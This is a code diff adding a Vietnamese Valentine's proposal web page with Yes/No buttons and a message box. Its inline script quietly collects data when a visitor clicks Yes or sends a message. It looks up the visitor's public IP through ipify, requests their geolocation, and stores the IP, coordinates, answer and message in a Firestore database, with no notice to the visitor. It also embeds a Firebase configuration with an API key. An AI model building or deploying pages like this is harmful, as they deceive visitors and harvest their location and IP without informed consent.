@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="vi">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>My Valentine</title>
+        <link rel="icon" type="image/x-icon" href="img/title_img.png" />
+        <link rel="stylesheet" href="style.css" />
+    </head>
+    <body>
+        <h1>Bạn có muốn làm Valentine của tớ không? 💖</h1>
+        <img id="expression-gif" src="img/output-onlinegiftools.gif" alt="Expression GIF" />
+        <div class="container">
+            <div class="buttons">
+                <button id="yes">Yes</button>
+                <button id="no">No</button>
+            </div>
+            <div id="gif-container">
+                <img id="love-gif" src="img/minding-peachcat-love.gif" alt="Love GIF" width="200" />
+                <p>Tớ biết mà! Yêu cậu nhiều 💕</p>
+                <!-- Input cho tin nhắn -->
+                <div class="message-container">
+                    <div class="input-container">
+                        <input type="text" id="message" placeholder="Gửi cho mình nè ?" />
+                        <img id="dice-icon" src="img/7101743.png" alt="🎲" class="dice-icon" />
+                    </div>
+                    <div>
+                        <button id="send-message">Gửi 💌</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Popup cảm ơn -->
+        <div id="thank-you-popup" class="popup">
+            <div class="popup-content">
+                <h2>🎉 Cảm ơn bạn! 🎉</h2>
+                <p>Tớ rất vui khi nhận được lời nhắn từ bạn! 💖</p>
+            </div>
+        </div>
+    </body>
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js';
+        import { getDatabase, ref, set, push } from 'https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js';
+        import {
+            getFirestore,
+            collection,
+            addDoc,
+        } from 'https://www.gstatic.com/firebasejs/11.3.0/firebase-firestore.js';
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: 'AIzaSyDQ5uSWUg01FQitvL30wQfE9zEY6Zpo3xs',
+            authDomain: 'movie-app-vxnatt.firebaseapp.com',
+            projectId: 'movie-app-vxnatt',
+            storageBucket: 'movie-app-vxnatt.appspot.com',
+            messagingSenderId: '765555458236',
+            appId: '1:765555458236:web:9e6c8873126c8f05c7d0b9',
+        };
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const db = getFirestore(app);
+
+        async function getUserLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('Trình duyệt không hỗ trợ Geolocation');
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                        });
+                    },
+                    (error) => reject(error.message),
+                );
+            });
+        }
+
+        async function saveResponse(answer, message) {
+            try {
+                // Lấy IP công khai
+                const publicIPRes = await fetch('https://api64.ipify.org?format=json');
+                const publicIPData = await publicIPRes.json();
+                const publicIP = publicIPData.ip;
+
+                // Lấy IP local
+                const location = await getUserLocation().catch((err) => ({ error: err }));
+
+                // Lưu vào Firestore
+                await addDoc(collection(db, 'responses'), {
+                    answer: answer,
+                    publicIP: publicIP, // IP công khai
+                    location: location || 'Không lấy được', // Nếu lỗi, ghi "Không lấy được"
+                    message: message || 'Không có lời nhắn',
+                    timestamp: formatTimestamp(Date.now()),
+                });
+            } catch (e) {
+                console.error('Siuu');
+            }
+        }
+
+        function formatTimestamp(timestamp) {
+            const date = new Date(timestamp);
+            return date.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+        }
+
+        document.getElementById('yes').addEventListener('click', () => saveResponse('Yes', ''));
+        document.getElementById('send-message').addEventListener('click', () => {
+            const message = document.getElementById('message').value.trim();
+            if (message) {
+                saveResponse('Yes', message);
+                document.getElementById('message').value = '';
+            } else {
+                alert('Bạn quên chưa nhập rồi! 💌');
+            }
+        });
+    </script>
+    <script src="script.js"></script>
+</html>
